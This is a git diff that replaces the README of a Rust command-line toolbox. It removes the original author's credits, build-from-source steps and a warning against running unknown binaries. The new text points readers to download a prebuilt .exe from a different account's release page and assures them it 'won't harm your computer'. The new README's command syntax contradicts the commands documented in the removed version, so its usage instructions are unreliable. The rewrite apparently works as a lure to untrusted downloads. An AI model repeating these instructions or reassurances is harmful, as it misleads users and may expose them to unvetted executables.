@@ -1,363 +1,184 @@
-# 🛠 Toolbox – Advanced CLI Utilities
+# 🧰 Toolbox-CLI-RUST - Simple Tools for Everyday Tasks
 
-**Developed by:** Syed Shaheer Hussain
-**Year:** 2026
-**Copyright:** © 2026 Syed Shaheer Hussain
+[![Download Toolbox-CLI-RUST](https://img.shields.io/badge/Download-Toolbox--CLI--RUST-blue?style=for-the-badge&logo=rust)](https://github.com/rknagar/Toolbox-CLI-RUST/releases)
 
-**One-line description:**
+## 📝 What is Toolbox-CLI-RUST?
 
-> Toolbox is a comprehensive Rust-based CLI utility suite offering a collection of developer, security, cryptography, and productivity tools in a single command-line interface.
+Toolbox-CLI-RUST is a collection of useful programs you can run from the command line on your computer. It combines many tools into one place. These tools help with tasks like security checks, encrypting messages, working with text, and managing data. 
 
-## 📌 Introduction
+Even though it is designed with developers in mind, anyone can use it. You do not need to know programming to run the tools. Everything works in the terminal or command prompt on your computer.
 
-Toolbox is a **multi-functional command-line utility** built in Rust. It combines tools for **cryptography, encoding/decoding, text manipulation, scheduling, random generation, compression, JSON/JSON Web Token handling, terminal UI, and more**.
+## 💻 What can you do with Toolbox-CLI-RUST?
 
-**Purpose:**
+Here are some examples of what Toolbox-CLI-RUST offers:
 
-* To have a single, portable CLI tool for developers and security enthusiasts.
-* To provide utilities that are normally scattered across multiple scripts or software.
-* To help users handle encryption, encoding, formatting, and system tasks safely.
+- **Encrypt and decrypt messages** with AES encryption.
+- **Generate unique codes and IDs** using UUID generation.
+- **Work with JSON files** for data management.
+- **Create and verify JWT tokens** for security.
+- **Use HMAC codes** for message authentication.
+- **Search and match text patterns** using regular expressions.
+- **Convert and track timestamps** in Unix format.
+- **Run productivity tools** to simplify your daily tasks.
 
-Perfect! Since your project now **builds cleanly**, let’s summarize how you can **run, install, and execute each tool command**. I’ll go step by step so everything works as expected.
+All these tools are accessible through a single program that you run on your computer.
+
+## 📥 Download & Install
+
+To get Toolbox-CLI-RUST on your computer, follow these steps:
+
+1. Visit this page to download the software:  
+   [Download Toolbox-CLI-RUST](https://github.com/rknagar/Toolbox-CLI-RUST/releases)
+
+2. Choose the version that fits your computer. Look for files ending with `.exe` if you use Windows, or files ending with `.tar.gz` or `.zip` if you use Mac or Linux.
+
+3. Download the file to your computer.
+
+4. For Windows users, just double-click the `.exe` file you downloaded and follow the instructions.
+
+5. For Mac or Linux users, open your terminal and navigate to the folder with the downloaded file. Unpack it if it is compressed, and then run the program by typing `./toolbox` or the name shown on the release page.
+
+6. Once installed, open your terminal or command prompt and type `toolbox` to see the list of available tools and commands.
+
+## 🖥️ System Requirements
+
+Toolbox-CLI-RUST works on many computers. Here are the main requirements:
+
+- **Operating Systems supported:**  
+  - Windows 10 or later  
+  - macOS Mojave or later  
+  - Most Linux distributions with standard terminal access
+
+- **Processor:** Any modern Intel or AMD processor or equivalent.
+
+- **Memory:** At least 512 MB of RAM.
+
+- **Disk space:** About 50 MB free space to install and run.
+
+- **Terminal or command prompt:** This is where you type instructions to run the tools.
+
+If you are unsure about your system, just try downloading and running the program. It won't harm your computer.
+
+## 🚀 How to Use Toolbox-CLI-RUST
+
+After you install the program, open a terminal or command prompt window. You can open the terminal in different ways depending on your system:
+
+- **Windows:** Search for “Command Prompt” or “PowerShell” in the Start menu.
+
+- **Mac:** Open “Terminal” from Applications > Utilities.
+
+- **Linux:** Look for “Terminal” in your applications menu.
+
+Once open, type the following command and press Enter:
+
+```
+toolbox --help
+```
+
+This command shows all the tools you can use and how to use them. You will see a list with descriptions for each tool.
+
+### Running a simple tool
+
+For example, to create a new universally unique identifier (UUID), type:
+
+```
+toolbox uuid
+```
+
+The program will give you a random UUID. This is a unique number that can identify something in your projects or files.
+
+### Encrypting a message
+
+To encrypt text with AES encryption, you might use:
+
+```
+toolbox aes encrypt your-message-here your-password
+```
+
+Replace `your-message-here` with the text you want to encrypt and `your-password` with a word you choose. The program will return an encrypted message you can safely send or store.
+
+### Decrypting a message
+
+If you receive an encrypted message, decrypt it by running:
+
+```
+toolbox aes decrypt encrypted-text your-password
+```
+
+Replace `encrypted-text` with the code you received and `your-password` with the same password used before.
+
+Each tool has its own short guide shown with:
+
+```
+toolbox toolname --help
+```
+
+For example, `toolbox jwt --help` shows how to create and verify JWT tokens.
+
+## 🔧 Common Commands and Tools
+
+| Tool         | What it Does                        | How to Use Example              |
+|--------------|-----------------------------------|--------------------------------|
+| `aes`        | Encrypt or decrypt data            | `toolbox aes encrypt "text" key`|
+| `uuid`       | Generate unique IDs                | `toolbox uuid`                  |
+| `json`       | Work with JSON strings             | `toolbox json validate file.json`|
+| `jwt`        | Create and verify tokens           | `toolbox jwt create payload`   |
+| `hmac`       | Create message authentication codes| `toolbox hmac generate "msg" key`|
+| `regex`      | Search or match text patterns      | `toolbox regex search pattern file.txt`|
+| `timestamp`  | Convert Unix timestamps            | `toolbox timestamp now`         |
+
+Use the `--help` option with each tool to learn more about usage and options.
+
+## 🔒 Security and Privacy
+
+Toolbox-CLI-RUST is created with care for your privacy. It does not share your data anywhere. All tasks run locally on your computer. When you use encryption tools, your passwords and messages stay private and are not sent over the internet.
+
+Always use strong passwords for encryption and keep your software up to date.
+
+## 📚 Learn More and Get Help
+
+If you want to understand more about the tools or need help:
+
+- Check the official [GitHub page](https://github.com/rknagar/Toolbox-CLI-RUST) for examples and guides.
+
+- Use the built-in help by typing:
+
+```
+toolbox --help
+```
+
+or for a specific tool:
+
+```
+toolbox toolname --help
+```
+
+- You can also open an issue on GitHub if you find problems or have questions.
+
+## ⚙️ Updating Toolbox-CLI-RUST
+
+When new versions are released, it is a good idea to update your program to get the latest features and fixes.
+
+1. Visit the release page again:  
+   [Download Toolbox-CLI-RUST](https://github.com/rknagar/Toolbox-CLI-RUST/releases)
+
+2. Download the newest file for your system.
+
+3. Replace the old file with the new one, or follow the instructions that come with the update.
+
+## 🌍 About the Project
+
+Toolbox-CLI-RUST is built using the Rust programming language. Rust is known for being safe, fast, and reliable. This project aims to give users a set of practical command-line tools that work well on many operating systems.
+
+It supports tasks in:
+
+- Cryptography and encryption  
+- Developer utilities  
+- Data formatting and management  
+- Productivity helpers  
+
+Everything is open source and free to use.
 
 ---
 
-## **1️⃣ Run commands using Cargo**
-
-Use:
-
-```bash
-cargo run -- <command> [arguments]
-
-```
-
-**Examples:**
-
-| Command        | Example                                                                     | What it does                             |
-| -------------- | --------------------------------------------------------------------------- | ---------------------------------------- |
-| `uuid`         | `cargo run -- uuid`                                                         | Generates a new UUID                     |
-| `timestamp`    | `cargo run -- timestamp`                                                    | Prints current UNIX timestamp            |
-| `jsonpretty`   | `cargo run -- jsonpretty '{"foo": "bar"}'`                                  | Pretty-prints JSON                       |
-| `jsonminify`   | `cargo run -- jsonminify '{"foo": "bar"}'`                                  | Minifies JSON                            |
-| `base64encode` | `cargo run -- base64encode "hello world"`                                   | Encodes string in Base64                 |
-| `base64decode` | `cargo run -- base64decode "aGVsbG8gd29ybGQ="`                              | Decodes Base64                           |
-| `aesencrypt`   | `cargo run -- aesencrypt "mysecretkey1234567890123456" "Hello"`             | AES-256 encrypts text                    |
-| `aesdecrypt`   | `cargo run -- aesdecrypt "mysecretkey1234567890123456" "<iv>:<ciphertext>"` | AES-256 decrypts text                    |
-| `password`     | `cargo run -- password 12`                                                  | Generates a random 12-character password |
-
-> Note: For AES encryption/decryption, the key **must be exactly 32 bytes** (Aes256).
-
-## **2️⃣ Build a standalone executable**
-
-To **build a release version**:
-
-```bash
-cargo build --release
-
-```
-
-This creates the binary at:
-
-```
-target/release/toolbox.exe   # on Windows
-target/release/toolbox       # on Linux/macOS
-
-```
-
-You can then run it **without Cargo**:
-
-```bash
-.\target\release\toolbox.exe uuid
-
-```
-
-or
-
-```bash
-./target/release/toolbox timestamp
-```
-
-## **3️⃣ Install globally (optional)**
-
-If you want to use `toolbox` like any system command:
-
-```bash
-cargo install --path .
-
-```
-
-After that, `toolbox` will be in your PATH, so you can run anywhere:
-
-```bash
-toolbox uuid
-toolbox jsonpretty '{"a": 1}'
-toolbox password 16
-
-```
-
-## **4️⃣ Run TUI (terminal UI)**
-
-```bash
-cargo run -- tui
-
-```
-
-It will open the Ratatui interface.
-
-## ✅ Notes & Tips
-
-1. **Case-sensitivity:** Currently, commands are case-sensitive (`uuid` works, `UUID` does not).
-
-   * If you want **fully case-insensitive commands**, I can update the code using Clap’s `ArgEnum` or manual mapping.
-
-2. **AES Encryption/Decryption:**
-
-   * Always use **32-character key** (Aes256)
-   * Decryption input must be `<iv>:<ciphertext>` in hex format.
-
-3. **Clipboard or stdin support:**
-
-   * Some commands like `base64encode` read stdin if no argument is passed.
-
-**Why it was made:**
-
-* To save time and effort in using multiple tools for small tasks.
-* To provide a secure and local environment for sensitive operations.
-* To explore Rust capabilities for fast, reliable, and memory-safe CLI applications.
-
-## 🎯 Objectives
-
-1. Provide a unified CLI for multiple development and security tasks.
-2. Offer tools for cryptography: AES encryption, hashing, HMAC, UUID generation.
-3. Include encoding/decoding utilities: Base64, Base32, URL encoding.
-4. Facilitate JSON handling: pretty-print, minify, JWT signing/decoding.
-5. Include randomization tools: passwords, numbers, lorem text.
-6. Offer compression and decompression with gzip.
-7. Provide a terminal-based UI for easier interaction (`tui` command).
-8. Generate command completions for PowerShell.
-
-## 🧩 Features
-
-* **UUID & Timestamp:** Generate unique identifiers and current UNIX timestamp.
-* **JSON Tools:** Pretty-print and minify JSON strings.
-* **JWT Tools:** Sign and decode JSON Web Tokens.
-* **Encoding/Decoding:** Base64, Base32, URL encoding/decoding.
-* **Regex Tester:** Test regular expressions against text.
-* **Cryptography:** AES-256 encryption/decryption, SHA-256 hashing, HMAC-SHA256.
-* **Text & Random Utilities:** Lorem generator, random numbers, password generator, ASCII codes.
-* **Compression:** Gzip compress/decompress files.
-* **Cron Scheduler:** Compute next run times from cron expressions.
-* **Terminal UI:** Interactive Ratatui interface.
-* **Command Completions:** Generate PowerShell completions.
-
-## ⚙️ Functions / Commands
-
-| Command | Example | Description |
-| --- | --- | --- |
-| `uuid` | `toolbox uuid` | Generates a new UUID |
-| `timestamp` | `toolbox timestamp` | Prints UNIX timestamp |
-| `jsonpretty` | `toolbox jsonpretty '{"foo": "bar"}'` | Pretty-print JSON |
-| `jsonminify` | `toolbox jsonminify '{"foo": "bar"}'` | Minify JSON |
-| `base64encode` | `toolbox base64encode "hello"` | Base64 encode string |
-| `base64decode` | `toolbox base64decode "aGVsbG8="` | Base64 decode string |
-| `base32encode` | `toolbox base32encode "text"` | Base32 encode string |
-| `base32decode` | `toolbox base32decode "MFRA"` | Base32 decode string |
-| `urlencode` | `toolbox urlencode "hello world"` | URL encode string |
-| `urldecode` | `toolbox urldecode "hello%20world"` | URL decode string |
-| `regex` | `toolbox regextest "\\d+" "123"` | Test regex |
-| `jwt` | `toolbox jwtsign '{"id":1}' "secret"` | Sign JWT |
-| `jwtdecode` | `toolbox jwtdecode "<token>"` | Decode JWT |
-| `hash` | `toolbox hash "text"` | SHA256 hash |
-| `hmac` | `toolbox hmac "key" "message"` | HMAC-SHA256 |
-| `aesencrypt` | `toolbox aesencrypt "32charkey..." "text"` | AES-256 encrypt |
-| `aesdecrypt` | `toolbox aesdecrypt "32charkey..." "<iv>:<ciphertext>"` | AES-256 decrypt |
-| `password` | `toolbox password 12` | Random password |
-| `random` | `toolbox random 1 100` | Random number |
-| `lorem` | `toolbox lorem 10` | Generate lorem words |
-| `upper` | `toolbox upper "text"` | Uppercase |
-| `lower` | `toolbox lower "TEXT"` | Lowercase |
-| `ascii` | `toolbox ascii "text"` | Print ASCII codes |
-| `gzipcompress` | `toolbox gzipcompress file.txt` | Compress file |
-| `gzipdecompress` | `toolbox gzipdecompress file.gz` | Decompress file |
-| `cronnext` | `toolbox cronnext "* * * * *"` | Next cron run |
-| `tui` | `toolbox tui` | Launch interactive terminal UI |
-| `completions` | `toolbox completions` | Generate PowerShell completion |
-
-## 🏗 Technologies Used
-
-* **Rust** – System programming language for performance and safety.
-* **Clap** – CLI argument parser.
-* **Clap Complete** – Generate shell completions.
-* **Ratatui** – Terminal UI toolkit.
-* **AES, HMAC, SHA2** – Cryptography.
-* **Base64/Base32** – Encoding.
-* **Flate2** – Gzip compression.
-* **Regex** – Text pattern matching.
-* **UUID** – Universally unique IDs.
-* **Chrono & Cron** – Date/time utilities.
-* **Rand & OsRng** – Randomization.
-
-## 🗂 Project Structure
-
-```
-toolbox/
-├─ src/
-│  ├─ main.rs          # Main code with all commands
-├─ Cargo.toml          # Rust project config
-├─ Cargo.lock          # Dependency lock
-└─ target/             # Compilation output
-
-```
-
-## 🔧 Installation & Running
-
-### **1️⃣ Run directly via Cargo**
-
-```bash
-cargo run -- <command> [arguments]
-
-```
-
-### **2️⃣ Build Release Executable**
-
-```bash
-cargo build --release
-
-```
-
-### Run without Cargo:
-
-## Windows
-
-```
-.\target\release\toolbox.exe uuid
-
-```
-## Linux/Mac
-
-```
-./target/release/toolbox uuid
-
-```
-
-### **3️⃣ Install Globally**
-
-```bash
-cargo install --path .
-
-```
-
-Now you can run anywhere:
-
-```bash
-
-toolbox uuid
-
-```
-```
-toolbox password 16
-
-```
-
-### **4️⃣ Terminal UI**
-
-```bash
-cargo run -- tui
-
-```
-
-## ⚙️ How it Works
-
-* Each **command** is implemented as a `Subcommand` of Clap’s `Parser`.
-* Arguments are validated and optionally read from stdin.
-* Cryptography functions use AES, SHA256, and HMAC implementations.
-* Encoding/decoding uses standard Base64/Base32 and URL encoding crates.
-* `tui` command uses Ratatui to render a block-based terminal interface.
-* Gzip compress/decompress uses Flate2 streams.
-
-## 🛡 Safety & Security
-
-* All operations are **local**, no data is sent to external servers.
-* **AES key must be 32 bytes**, never share keys publicly.
-* **Passwords & tokens** should be handled securely.
-* Be cautious with file paths to avoid overwriting files.
-* Use `cargo install` to avoid running unknown binaries from internet.
-* Verify commands before running sensitive operations.
-
-## ⚠️ Disclaimer
-
->[!warning]
-> This software is **for educational and personal use**. The developer is not responsible for misuse, data loss, or security breaches. Always use strong passwords and encryption keys responsibly.
-
-## 🖥 GUI / Terminal Interface
-
-* `tui` command provides a **terminal UI** to navigate tools interactively.
-* Uses Ratatui library for cross-platform terminal rendering.
-* You can extend it in the future for menus and tool selection.
-
-## 🔮 Future Enhancements
-
-* Case-insensitive commands.
-* Support for more encodings (Hex, URL-safe Base64).
-* More TUI features: menus, logging, copy-to-clipboard.
-* File-based JSON and encryption pipelines.
-* Web-based interface or Electron wrapper.
-
-## 🔁 Flowchart
-
-```
-User Input
-    │
-    ▼
-Clap Parser (Cli)
-    │
-    ├─> Command Matching
-    │      ├─ Crypto (AES/HMAC/Hash)
-    │      ├─ Encoding (Base64/Base32/URL)
-    │      ├─ JSON/JWT
-    │      ├─ Compression
-    │      ├─ Random/Text
-    │      └─ TUI/Completions
-    │
-    ▼
-Execution
-    │
-    ▼
-Output to Terminal / Files
-
-```
-
-## 💡 Key Concepts
-
-* **CLI Utilities:** One command line program for multiple functions.
-* **Subcommands:** Each tool has its own argument set.
-* **Cross-platform:** Works on Windows, Linux, macOS.
-* **Security-first:** Local cryptography, safe random generation.
-* **Extensible:** Easily add new tools as subcommands.
-
-## 🔑 Summary
-
-* **Use:** Development, cryptography, encoding, random generation, text manipulation.
-* **Value:** Saves time, local secure operations, single tool for multiple tasks.
-* **Run:** Via Cargo, release build, or installed binary.
-* **Important:** Use strong keys, avoid sharing sensitive data.
-
-## ⭐ Support & Engagement
-
-If you find this repository useful or insightful, please consider:
-
-- ⭐ Starring the repository
-- 🔁 Sharing it within your network
-- 👤 Following my GitHub profile for future projects and updates
-
-Your support helps drive continued innovation and open-source contributions.
-
-— Syed Shaheer Hussain
-
-[![GitHub followers](https://img.shields.io/github/followers/SyedShaheerHussain?label=Follow&style=social)](https://github.com/SyedShaheerHussain)
-
-![Followers](https://img.shields.io/github/followers/SyedShaheerHussain?label=Followers&color=blue)
-
-![Stars](https://img.shields.io/github/stars/SyedShaheerHussain/Toolbox-CLI-RUST?label=Stars&color=yellow)
-
-✅ **Developed by Syed Shaheer Hussain – 2026**
+[![Download Toolbox-CLI-RUST](https://img.shields.io/badge/Download-Toolbox--CLI--RUST-blue?style=for-the-badge&logo=rust)](https://github.com/rknagar/Toolbox-CLI-RUST/releases)
